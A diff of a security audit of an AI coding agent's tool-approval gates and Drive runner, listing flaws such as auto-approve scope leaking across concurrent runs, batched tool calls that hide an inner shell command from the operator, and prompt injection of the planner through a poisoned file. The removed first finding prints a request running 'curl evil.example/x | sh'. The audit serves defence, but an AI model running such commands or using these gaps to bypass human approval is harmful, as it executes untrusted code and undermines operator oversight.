@@ -1,205 +1,183 @@
-# sc-business-logic — DFMC Business-Logic Findings
+# sc-business-logic — DFMC Business-Logic Findings (Phase 2)
+
+**Scope:** approval-gate funnel integrity, Drive run abuse, BeginAutoApprove scope leakage, parking/resume semantics, token-budget bypass, meta-tool boundary, hook firing order. Read-only audit; no code changes.
 
 **Counts**
-- Critical: 1
-- High:     3
-- Medium:   3
-- Low:      2
-- Info:     1
-- Total:    10
+- High:    2
+- Medium:  3
+- Low:     2
+- Info:    2
+- Total:   9
 
-Scope: Drive runner state machine, conversation branching, tool approval gate `source=="user"` semantics, agent-loop budget enforcement, autonomous-resume ceiling, hook lifecycle.
-CWE families: CWE-841 (improper enforcement of behavioural workflow), CWE-284 (improper access control), CWE-915 (improperly controlled modification of dynamically-determined object attributes), CWE-770 (allocation of resources without limits / throttling).
+CWE families: CWE-841 (workflow flaw), CWE-284 (improper access control), CWE-362 (race condition in workflow ordering), CWE-770 (resource limits), CWE-693 (protection mechanism failure).
 
 ---
 
-## LOGIC-001 — HTTP/WS tool endpoint hardcodes `source="user"`, fully bypassing the approval gate
+## LOGIC-201 — `BeginAutoApprove` restore is **not stack-safe** under non-nested concurrency
 
-- **Severity:** Critical
+- **Severity:** High
 - **Confidence:** High
-- **CWE:** CWE-284 (Improper Access Control), CWE-841 (Improper Enforcement of Behavioral Workflow)
+- **CWE:** CWE-362 / CWE-841
 - **Files:**
-  - `ui/web/server_tools_skills.go:151-173` (`handleToolExec`)
-  - `ui/web/server_ws.go:244-266` (`wsConn.handleTool`)
-  - `internal/engine/engine_tools.go:116-138` (`Engine.CallTool` calls `executeToolWithLifecycle(ctx, name, params, "user")`)
-  - `internal/engine/engine_tools.go:218-244` (approval gate `if source != "user"`)
+  - `internal/engine/drive_adapter.go:285-297` (`BeginAutoApprove`/`release`)
+  - `internal/engine/approver.go:62-92` (single-slot global `approverPerEngine`)
+  - `internal/drive/driver.go:167-168, 275-276` (Run + Resume each call `BeginAutoApprove` and `defer release`)
 
-**Finding.** Every backend tool — including `run_command`, `write_file`, `edit_file`, `apply_patch`, `git_commit`, `web_fetch` — is exposed at `POST /api/v1/tools/{name}` and over the WS `tool` method. Both handlers route through `engine.CallTool`, which unconditionally hardcodes `source="user"`. The gate at line 225 (`if source != "user" && e.requiresApproval(name)`) therefore **never fires** for HTTP/WS-initiated calls.
+**Finding.** `BeginAutoApprove` snapshots the **current** approver into a local `prev`, installs a wrapper, and `release()` restores `prev` via `SetApprover`. Restoration is unconditional — it does NOT check that the currently-installed approver is still the wrapper this call installed. The pattern is correct for strictly nested calls (LIFO via `defer`), but `Driver.Run` / `Driver.Resume` from CLI/HTTP/MCP can run **concurrently** for different run IDs in the same process:
 
-A holder of the bearer token (or anyone reaching the loopback port from a malicious local browser tab via the WS endpoint, since `CheckOrigin` returns `true`) can:
+1. Run A starts → saves `prev_A = nil`, installs wrapper_A.
+2. Run B starts → saves `prev_B = wrapper_A`, installs wrapper_B.
+3. Run A finishes first → `release_A` calls `SetApprover(nil)` — **wipes wrapper_B mid-flight** (B's tool calls now hit the no-approver deny path until B's `release` swaps the zombie back).
+4. Run B finishes → `release_B` calls `SetApprover(wrapper_A)` — installs an approver pointing at A's already-finished allowlist.
+
+Because there is no per-run guard around the slot, the next non-Drive `/chat` or `/tool` request is gated by a zombie wrapper that auto-approves whatever A's allowlist contained. With `auto_approve: ["*"]` (a common Drive setup) this is a **post-Drive auto-approve leak** affecting unrelated user-initiated requests until something else calls `SetApprover`.
+
+The drive registry (`internal/drive/registry.go`) already supports concurrent runs (`Active()` returns a list), and HTTP `POST /api/v1/drive` does not serialise spawns, so multiple concurrent runs are reachable in practice.
+
+**Fix sketch.** Use a counted-stack of approvers (or store an opaque token returned by `SetApprover` so `release` only restores when it still owns the slot). Alternatively, gate Drive runs with a process-wide single-flight semaphore so `BeginAutoApprove` is provably nested.
+
+---
+
+## LOGIC-202 — `apply_patch` checks read-gate and reads source bytes BEFORE acquiring `LockPath`
+
+- **Severity:** High
+- **Confidence:** High
+- **CWE:** CWE-362 (TOCTOU)
+- **Files:**
+  - `internal/tools/apply_patch.go:106-147` (Stat + `EnsureReadBeforeMutation` + `os.ReadFile original`)
+  - `internal/tools/apply_patch.go:166-170` (`LockPath` acquired AFTER read, before write only)
+
+**Finding.** `apply_patch` performs in this order:
 
 ```
-POST /api/v1/tools/run_command
-{"params":{"command":"curl evil.example/x | sh"}}
+os.Stat(abs)                                   // line 106
+EnsureReadBeforeMutation(abs)                  // line 110 (strict, hash equality)
+original, _ := os.ReadFile(abs)                // line 142
+applyHunks(original, ...)                      // line 149 — produces 'updated' from 'original'
+release := t.engine.LockPath(abs)              // line 167  ← lock comes AFTER read
+writeFileAtomic(abs, []byte(updated), ...)     // line 169
 ```
 
-…with no operator confirmation, no TUI prompt, no `DFMC_APPROVE` consultation. The architecture doc explicitly notes this at line 522: *"even an authenticated web client invoking POST /api/v1/tools/run_command with source=user skips the approval gate"* — but the HTTP handler **gives the caller no way to specify a different source**, so the bypass is mandatory, not opt-in.
+Between the `EnsureReadBeforeMutation` hash check (which reads the file to compute SHA) and `LockPath`, a concurrent `edit_file` / parallel `apply_patch` worker holding the same path's lock can complete its mutation. When `apply_patch` finally acquires the lock and writes `updated`, the bytes are derived from a **stale `original`** — concurrent edits are silently overwritten. The read-gate's hash check protects against fabricated diffs but cannot protect against this in-flight race because the gate runs before the lock.
 
-**Impact.** Approval-gate bypass for every dangerous tool over network surface. Combined with `WebSocket CheckOrigin: true` (`ui/web/server_ws.go:32-35`), a malicious page on the same machine can DNS-rebind / origin-hop into an authenticated WS session and weaponize this directly.
+`edit_file` (`builtin_edit.go:60-101`) does the right thing: `LockPath` first, then `os.ReadFile`, then write — fully serialised inside the lock window.
 
-**Fix.** Require an explicit `source` field on the request body, default to `"agent"` (so the approval gate engages), and refuse `source="user"` unless the caller proves human presence (e.g. an interactive TUI/CLI flag, never an HTTP body). Alternatively, treat HTTP/WS tool calls as `"http"` and add an HTTP-specific gate check.
+**Fix sketch.** Move `release := LockPath(abs)` BEFORE the `os.ReadFile(abs)` on line 142 (and ideally before `EnsureReadBeforeMutation` so the hash check sees the same bytes that will be written). Note the related defect: the existing `defer release()` is inside the per-file loop, so locks accumulate across all files and release only at function return — refactor so each file's lock is released at the end of its iteration to avoid lock-ordering deadlocks if the loop ever sees the same path twice.
 
 ---
 
-## LOGIC-002 — `PATCH /api/v1/tasks/{id}` mass-assigns task state without a transition guard
+## LOGIC-203 — `symbol_rename` and `symbol_move` mutate without `LockPath` (read-gate-only)
 
 - **Severity:** High
 - **Confidence:** High
-- **CWE:** CWE-841 (Behavioral Workflow), CWE-915 (Mass Assignment)
-- **File:** `ui/web/server_task.go:159-218`
-
-**Finding.** `handleTaskUpdate` decodes the body into a `map[string]any` and applies any of `title, detail, state, summary, error, confidence, blocked_reason, labels, parent_id` to the persisted task without consulting the current state. There is no allowed-transition graph — a remote caller can:
-
-- Flip `state` from `done` → `pending` and back
-- Set `state="done"` on a task that never started (forging completion)
-- Reparent any task to any other (`parent_id`), creating cycles that `taskstore.ValidateTree` is supposed to detect AFTER the fact (`internal/taskstore/store.go:322-356`) — but the API does not call `ValidateTree` post-update
-- Clear `error` / `blocked_reason` after a hard failure to make the task look successful
-
-**Impact.** A drive run that depends on a task tree (via Drive's `dfmc_drive_active`/`dfmc_drive_status` MCP synthetic tools or direct task store consumers) can be tricked into believing work was done that wasn't, or into proceeding because a "blocked" upstream was silently unblocked. The reverse — flipping `done`→`pending` — re-queues already-completed work and burns budget.
-
-**Fix.** Validate state transitions against `supervisor.TaskState` enum, refuse `parent_id` changes that would create cycles, and disallow setting `state="done"` from an external API at all (only the executor may stamp completion).
-
----
-
-## LOGIC-003 — `PATCH /api/v1/tasks/{id}` allows reparenting that bypasses cycle detection at write time
-
-- **Severity:** High
-- **Confidence:** High
-- **CWE:** CWE-841
+- **CWE:** CWE-362
 - **Files:**
-  - `ui/web/server_task.go:203-205` (allows `patch["parent_id"]` blindly)
-  - `internal/taskstore/store.go:322-356` (`ValidateTree` exists but is not called from the HTTP path)
+  - `internal/tools/symbol_rename.go:171-216` (loop: `EnsureReadBeforeMutation` then `os.ReadFile` then `os.WriteFile`, no lock)
+  - `internal/tools/symbol_move.go:230-289` (multiple `os.WriteFile` paths, no `LockPath`)
 
-**Finding.** The `parent_id` field is settable but `Store.UpdateTask` does not call `ValidateTree` afterwards. `GetAncestors` (`store.go:262-291`) and `GetTree` (`store.go:215-258`) both have a defensive `visited` cycle guard — but they truncate the walk silently rather than raising an error. A cycle therefore won't crash the server but will silently change the perceived ancestry of every affected task; downstream BFS in `GetTree` will only return the tasks reachable up to the cycle.
+**Finding.** `symbol_rename` calls `EnsureReadBeforeMutation(fpath)`, then `os.ReadFile(fpath)`, modifies the slice in memory, then `os.WriteFile(fpath, ...)` — without ever calling `t.engine.LockPath(fpath)`. The same pattern recurs in `symbol_move`. Concurrent `edit_file`/`apply_patch`/parallel-batch dispatch on the same file (which DO acquire `LockPath`) will have their writes silently overwritten by the rename pass. Worse, `os.WriteFile` is **non-atomic** here (no temp+rename) — a crash mid-write truncates the target. `engine.go:84-88` explicitly warns this is the TOCTOU race that `LockPath` exists to close.
 
-**Fix.** Run cycle detection on every reparent (walk up via `LoadTask(parent_id)` until either nil-parent or self-revisit before accepting the update).
+`symbol_rename` and `symbol_move` are both registered tools (`engine.go:Register` calls), so they reach the operator over CLI, web, MCP, and the agent loop.
 
----
-
-## LOGIC-004 — Drive `RunPrepared` allows a caller to inject pre-populated `Todos` and `Status` fields
-
-- **Severity:** High
-- **Confidence:** High
-- **CWE:** CWE-915 (Mass Assignment), CWE-841
-- **Files:**
-  - `internal/drive/driver.go:98-219` (`RunPrepared` accepts a `*Run` from caller)
-  - `internal/drive/driver.go:108-127` resets `Status`/`Reason`/`EndedAt`/Todos but only conditionally:
-    - `if run.Todos == nil { run.Todos = []Todo{} }` — so a non-nil but pre-populated `Todos` slice from the caller is **kept**.
-  - `ui/web/server_drive.go:97-112` calls `drive.NewRun(req.Task)` (which is safe — `NewRun` constructs from task only), so the public HTTP path is OK; **but** `RunPrepared` is exported and any other caller can hand it a `Run` with arbitrary pre-set TODOs.
-
-**Finding.** `RunPrepared` is the *prepared-run* entry point intended to allow HTTP/MCP surfaces to return the run ID before planning. The implementation only zeros a small subset of fields — `run.Todos` is preserved if the caller provided a non-empty slice. A future caller (or any plugin code) handing a `*Run` with pre-fabricated TODOs would bypass the planner entirely and execute that hand-crafted plan against the engine's tool surface with `AutoApprove`.
-
-This is latent today (no current caller misuses it), but it is a clear contract trap: the function name says "prepared" but does not actually clean caller-supplied state. Mark as High because the door is wired up.
-
-**Fix.** In `RunPrepared`, unconditionally clear `run.Todos = []Todo{}` and `run.Plan = nil` at entry; if a caller wants to pre-populate, that should be a separate explicit method that names the contract.
+**Fix sketch.** Wrap each per-file mutation in `release := t.engine.LockPath(fpath); defer release()` and replace the bare `os.WriteFile` with `writeFileAtomic`. Optionally, hoist the read-snapshot+gate INSIDE the lock so the hash equality check covers the actual write window.
 
 ---
 
-## LOGIC-005 — `Resume` re-runs `Running` TODOs from scratch but does NOT re-validate `Done` ones — Done is final by ID, not by cryptographic chain
+## LOGIC-204 — Meta-tool boundary: `metaInBatchHint` defaults are correct, but inner `Execute` skips `executeToolWithLifecycle`
 
 - **Severity:** Medium
 - **Confidence:** High
-- **CWE:** CWE-841
-- **File:** `internal/drive/driver.go:229-283`, especially lines 250-254
-
-**Finding.** Resume loops over `run.Todos`, sets `Running -> Pending` (correct — interrupted work re-attempts) and leaves `Done/Blocked/Skipped` alone. Combined with the bbolt-persisted run record, an attacker who can write the bbolt file (e.g. an evil hook, a user with write access to `.dfmc/`, or a compromised bot account with file-write through `write_file`) can flip `TodoBlocked` → `TodoDone` in the persisted JSON between `dfmc drive stop` and `dfmc drive resume <id>`, and the Resume path will skip those TODOs as "already done" without re-executing them. The `result` summaries in `t.Brief` are also free-form strings; nothing binds them to actual tool execution.
-
-This is "trust the persisted file" — acceptable in the single-process / loopback-only model, but worth flagging because Drive resume doesn't carry a hash chain or signature on completed TODOs.
-
-**Fix (defense-in-depth).** Optionally hash each completed TODO's brief + tool-call summary into a chain so tampering with the persisted run is detected at resume.
-
----
-
-## LOGIC-006 — Auto-resume cumulative ceiling is enforced **before** the next attempt, but not within an attempt
-
-- **Severity:** Medium
-- **Confidence:** Medium
-- **CWE:** CWE-770 (Allocation of Resources Without Limits), CWE-841
+- **CWE:** CWE-693 (defence-in-depth gap)
 - **Files:**
-  - `internal/engine/agent_loop_autonomous.go:113-184` (`attemptAutoResume` checks ceiling once per resume)
-  - `internal/engine/agent_loop_autonomous.go:47-85` (`runNativeToolLoopAutonomous` outer wrapper)
-  - `internal/engine/agent_loop_limits.go:31-33` (defaults `MaxToolSteps=60`, `MaxToolTokens=250000`)
+  - `internal/tools/meta.go:392-403` (`metaInBatchHint`)
+  - `internal/tools/meta.go:352, 368, 543` (`t.engine.Execute` from inside `tool_call`/`tool_batch_call`)
+  - `internal/engine/engine_meta_hooks.go:1-23` (documented design choice)
 
-**Finding.** The cumulative ceiling (`stepCeiling = MaxSteps × multiplier`, default 60×10 = 600 steps; `tokenCeiling = MaxTokens × multiplier`, default 250 000×10 = 2.5 M tokens) is checked *before each resume attempt*, after `seed.CumulativeSteps += seed.Step`. Inside a single attempt the loop can still consume the full per-attempt budget. This means a single auto-resume cycle can briefly exceed the cumulative ceiling: at attempt N the ceiling is satisfied, the loop runs and burns up to MaxSteps + MaxTokens more, then attempt N+1 finally refuses. The overshoot per cycle is bounded by one full per-attempt budget — not unbounded — but the caller's expectation reading `resume_max_multiplier=10` is "exactly 10× MaxSteps total", and the actual ceiling is "between 10× and 11× MaxSteps".
+**Finding.** The boundary check itself is sound: `tool_call` (`meta.go:344-345`) and `tool_batch_call` (`meta.go:492-503`) both refuse meta-in-meta with self-teaching hints in `metaInBatchHint`, and `metaInBatchHint` covers all four meta names (`tool_search`, `tool_help`, `tool_call`, `tool_batch_call`) plus a default. ✓
 
-**Impact.** A clever prompt can extract one extra full budget worth of LLM cost beyond the configured ceiling. Cost-bounded environments (CI, paid-API) should set `resume_max_multiplier=1` and accept the per-budget hard stop.
+The intentional design is that meta tools dispatch inner calls through `tools.Engine.Execute` directly (registry lookup + read-gate) **rather than** through `engine.executeToolWithLifecycle`. Approval fires once at the meta level (so a 4-call batch isn't 4 prompts), and pre/post hooks fan out via `metaInnerNames`. This is correct as designed, but it means:
 
-**Fix.** Document the overshoot, or compute `stepCeiling - seed.CumulativeSteps` as a per-attempt cap so the very last resume runs exactly to the ceiling and stops.
+- **Approval per inner call cannot be denied selectively.** Approving the outer `tool_batch_call` approves all N inner tools as a unit. A wrapper that puts `run_command` between two `read_file`s gets the same single approval as a pure-read batch. The approval prompt copy in `ui/web/approver.go` shows the outer name; an operator clicking "approve" on a batch may not realise an inner `run_command` rides along. This is a UX/workflow flaw rather than a hard bypass.
+- **Sub-agent allowlist is checked at the meta boundary** via `metaInnerNames` (`engine_tools.go:296`), so allowlisted-only sub-agents are still safe.
 
----
-
-## LOGIC-007 — `AutoApprove` Drive scope wraps the **engine's** approver for the entire run, not per-TODO
-
-- **Severity:** Medium
-- **Confidence:** High
-- **CWE:** CWE-284
-- **Files:**
-  - `internal/drive/driver.go:165-167` (`d.runner.BeginAutoApprove(d.cfg.AutoApprove)` and the `defer release()`)
-  - `ui/web/server_drive.go:46-48` (the `AutoApprove []string` body field is mass-assignable, see also MASS-005)
-
-**Finding.** The HTTP `POST /api/v1/drive` body contains `auto_approve: ["run_command", "write_file", ...]`. The driver passes that list to `runner.BeginAutoApprove(...)` once, and a `defer release()` un-installs it on Run exit. Every sub-agent spawned by every TODO in the run sees the same wide-open approver. There is no per-TODO scoping (e.g. "this read-only research TODO does not need run_command auto-approved").
-
-A caller who can hit `POST /api/v1/drive` (auth token holder) and supply `auto_approve: ["*"]` effectively flips off the approval gate for the duration of the run for every spawned sub-agent. Combined with `LOGIC-001` this is a stacked attack: HTTP caller is already approval-bypassed for `/api/v1/tools/*`, plus they get a long-running approval-bypass scope for any tool the planner emits.
-
-**Fix.** Validate `auto_approve` against an allow-list of tool names (current accepts arbitrary strings); deny meta-wildcards; surface the active scope on `GET /api/v1/drive/{id}` so an operator can audit it; consider per-TODO `auto_approve` instead of run-wide.
+**Fix sketch.** Surface the inner names array in the approval prompt payload (the approver already receives `Params`; UI should display `metaInnerNames(name, params)` next to the tool name).
 
 ---
 
-## LOGIC-008 — Conversation branching corrupts history when `BranchSwitch` is called concurrently with `AddMessage`
-
-- **Severity:** Low
-- **Confidence:** Medium
-- **CWE:** CWE-362 (Race) / CWE-841
-- **Files:**
-  - `internal/conversation/manager.go:146-153` (`AddMessage` takes `m.mu.Lock()`)
-  - `internal/conversation/manager.go:174-185` (`BranchSwitch` also takes `m.mu.Lock()`)
-
-**Finding.** Both operations hold `m.mu.Lock()` correctly so the immediate map ops are atomic, BUT the *application-layer* sequence "user types → engine.Ask → AddMessage(user) → LLM call → AddMessage(assistant)" is not atomic. A web client can call `POST /api/v1/conversation/branches/switch` between the user-message append and the assistant-message append, splitting one logical exchange across two branches. The user message lands in branch A, the assistant reply lands in branch B, leaving branch A with an orphaned user turn (no reply) and branch B with an assistant message that has no question.
-
-**Impact.** Cosmetic data integrity (conversation history is wrong). Could feed the LLM a malformed prompt on a future turn (`role=assistant` immediately following a previous `role=assistant`), which some providers reject. Bbolt/JSONL persistence then preserves the corruption forever.
-
-**Fix.** Either (a) refuse `BranchSwitch` while a turn is mid-flight (track an "in-flight ask" flag), or (b) document this as expected — switching branches mid-ask is a "you broke it, you keep the pieces" operation.
-
----
-
-## LOGIC-009 — `BranchCreate` allows orphan branch names (e.g. `..`, `/`, names with control chars)
-
-- **Severity:** Low
-- **Confidence:** Medium
-- **CWE:** CWE-20 (Improper Input Validation)
-- **File:** `internal/conversation/manager.go:155-172`
-
-**Finding.** `BranchCreate` only validates `name == ""`. There is no check for the conversation-id-style validation that lives in `internal/storage/store.go:398` (`validateConvID`). Branch names land in the `Branches map[string][]types.Message` in memory and are persisted as JSON map keys. A branch named `"..\\..\\evil"` or with embedded NULs / newlines persists fine inside the JSON state file but breaks any UI that uses the name as a path segment or display label.
-
-This is bounded by the bearer-token gate and same-process trust, but the inconsistency with `validateConvID` is worth addressing.
-
-**Fix.** Apply the same character-set whitelist (`validateConvID`) to branch names.
-
----
-
-## LOGIC-010 — Hook lifecycle: a hook cannot cancel a tool, but a hook *can* race the approval gate
+## LOGIC-205 — Hook firing order is correct; post-hook fires **after** invalidation but **before** result return
 
 - **Severity:** Info
 - **Confidence:** High
-- **CWE:** CWE-841
-- **Files:**
-  - `internal/hooks/hooks.go:142-171` (`Fire` is sequential, no cancellation contract)
-  - `internal/engine/engine_tools.go:218-300` (approval gate runs BEFORE `pre_tool` hook fire)
+- **CWE:** —
+- **Files:** `internal/engine/engine_tools.go:339-388`
 
-**Finding.** Confirmed working as documented:
+**Finding.** Order in `executeToolWithLifecycle`:
 
-1. **Hook cannot cancel tool execution.** The architecture promise that hooks are "best-effort, never block a tool call" is honoured — `runOne` captures errors but never gates the `executeToolWithPanicGuard` call that follows. ✓
-2. **Hook cannot bypass the approval gate.** The approval gate runs at line 225-244 *before* the `pre_tool` hook fires at line 252-266; a hook firing a side-effect cannot back-door an unapproved tool. ✓
-3. **Inverse risk surfaced:** the `_reason` field stripping (`internal/tools/engine.go:437-444`) calls the `reasoningPublisher` callback before the read-gate / approval / hook lifecycle. A buggy reasoning publisher that takes long or panics would delay every tool call. The publisher is wrapped in `recover` in `eventbus.go`'s `SubscribeFunc` indirect path but `tools.Engine.Execute`'s direct call to `pub(name, reason)` is **not** panic-guarded. A subscriber that panics will crash the entire tool engine call.
+1. Sub-agent allowlist gate
+2. Approval gate
+3. Pre-tool hooks (outer + inner names)
+4. `executeToolWithPanicGuard` → `tools.Engine.Execute`
+5. `invalidateContextForTool` (only on `err == nil`)
+6. Post-tool hooks (outer + inner)
 
-**Fix (Info).** Wrap the `pub(name, reason)` call in a `defer recover()` to match the rest of the engine's panic-safety posture.
+This is the right ordering — pre-hooks see params before mutation, post-hooks see success/failure after the fact. One caveat: `invalidateContextForTool` runs BEFORE post-hooks, so a hook that re-runs `read_file` will get fresh content; this is fine. Hooks are best-effort with a 30s timeout and never block the call. ✓
 
 ---
 
-### What was checked and found OK (negative findings)
+## LOGIC-206 — Parking/resume cannot be hijacked by an unrelated user input
 
-- `Drive run state machine` finalization is single-funnelled through `finalize()` in `driver.go:289-314`. RunDone/RunStopped/RunFailed transitions only happen there. ✓
-- `Drive Resume` correctly refuses to re-enter terminal runs (`driver.go:246-249`). ✓
-- `Drive registry` cleanup is correctly deferred (`driver.go:157-158`); panics in the loop don't leak cancel funcs. ✓
-- Token budget caps (`max_tool_steps`, `max_tool_tokens`) are enforced in the loop's pre-round headroom check; parallel batch dispatch (`agent_loop_parallel.go`) also goes through `executeToolWithLifecycle` so per-batch step counting still works. ✓ (but see LOGIC-006 for the auto-resume edge.)
-- `meta_call_budget` and `meta_depth_limit` enforcement live in `engine_meta_hooks.go` and are tested in `engine_meta_hooks_test.go`. ✓
+- **Severity:** Info
+- **Confidence:** High
+- **CWE:** —
+- **Files:** `internal/engine/agent_parked.go:200-222` (`takeParkedAgent`/`saveParkedAgent`), `internal/engine/agent_loop_autonomous.go:213-260` (`ResumeAgent`)
+
+**Finding.** Parking is keyed on a single `*Engine.agentParked` slot, mutex-guarded, and `takeParkedAgent` atomically clears it. There is exactly ONE parked state per engine (per project process), so a "resume" cannot be stolen by another user — but in single-user trust model that is the correct invariant. The intent layer routes `RESUME` only when the snapshot matches the parked question (`internal/engine/engine_intent.go`). Cumulative-step/cumulative-token ceilings (`agent_loop_autonomous.go:122-148, 240-260`) prevent infinite auto-resume. ✓
+
+The only nit: `attemptAutoResume` accumulates `seed.CumulativeSteps += seed.Step` BEFORE the ceiling check, so a single overshoot-by-1-step run is treated as "ceiling hit" cleanly. Edge cases verified.
+
+---
+
+## LOGIC-207 — Drive task definition cannot escape the planner DAG
+
+- **Severity:** Low
+- **Confidence:** Medium
+- **CWE:** —
+- **Files:** `internal/drive/planner.go`, `internal/drive/scheduler.go`
+
+**Finding.** A malicious user task (`dfmc drive "<task>"`) feeds into the planner LLM prompt, which returns a JSON DAG. The planner's response is parsed with cycle detection and dep validation — circular deps fail planning. Per-TODO `file_scope` is enforced by `readyBatch` so two writers on the same file cannot run concurrently. `MaxParallel=3` and `MaxTodos` cap fan-out. `auto_approve` is the only widening, and it is per-run scoped (subject to LOGIC-201).
+
+What an attacker controlling the user prompt CAN do: cause the planner to emit a DAG whose first TODO fires `run_command` with a destructive command — but `run_command` is approval-gated unless on the auto-approve list, and the auto-approve list is operator-configured. No DAG-level escape.
+
+What an attacker controlling the **planner output** (e.g. via prompt injection from a poisoned file the planner reads as context) could do: emit a TODO with `provider_tag` mapped via `Config.Routing` to a different provider profile. This is intended behaviour but worth flagging — a poisoned planner can route TODOs to whichever provider profile is configured, including a higher-cost or lower-trust one.
+
+---
+
+## LOGIC-208 — Token-budget enforcement is sound; autonomous_resume multiplier honours config override
+
+- **Severity:** Info
+- **Confidence:** High
+- **Files:** `internal/engine/agent_loop_autonomous.go:113-184`
+
+**Finding.** `max_tool_tokens` is a live footprint cap, not a cumulative-per-round sum (per CLAUDE.md). The autonomous-resume wrapper enforces `cumulative_steps_ceiling = MaxSteps * resume_max_multiplier` and the same for tokens. `resumeMaxMultiplier()` falls back to default 10 only when config is zero. A model that keeps parking will hit the cumulative ceiling and surface `agent:loop:auto_resume_refused` — no infinite-loop path. ✓
+
+---
+
+## LOGIC-209 — `executeToolWithLifecycle` funnel is intact; no direct `tools.Engine.Execute` callers outside meta/test
+
+- **Severity:** Info
+- **Confidence:** High
+- **Files:** searched globally for `Engine.Execute(` callers
+
+**Finding.** Only three references to the raw `tools.Engine.Execute`:
+- `internal/engine/engine_meta_hooks.go:4` — comment.
+- `internal/engine/engine_tools.go:216` — comment.
+- `internal/tools/meta.go:352, 368, 543` — meta tools dispatching inner calls (intentional, see LOGIC-204).
+- `internal/engine/engine_tools.go:265` — `executeToolWithPanicGuard` (the canonical funnel).
+
+Network handlers (`/api/v1/tools/{name}`, WS `tool`, MCP `tools/call`) all route through `engine.CallTool` / `engine.CallToolFromSource` → `executeToolWithLifecycle`. The MCP Drive synthetic tools deliberately bypass via `driveMCPHandler` (CLAUDE.md documents this). No other bypass paths found. ✓
+
+---
+
+## Verdict
+
+Sharpest gap: **LOGIC-201** — the approver slot is global and single-valued; concurrent Drive runs (or any future parallel `BeginAutoApprove` user) leak a zombie wrapper after the first ends, silently widening approval scope for whatever requests come next. The fix is small (token-keyed restore) and the test in `internal/drive/parallel_test.go` does not exercise the non-nested ordering. **LOGIC-202** and **LOGIC-203** are real TOCTOU races whose blast radius is "silent loss of concurrent edits"; they share a common fix (acquire `LockPath` BEFORE the read-gate / `os.ReadFile`).
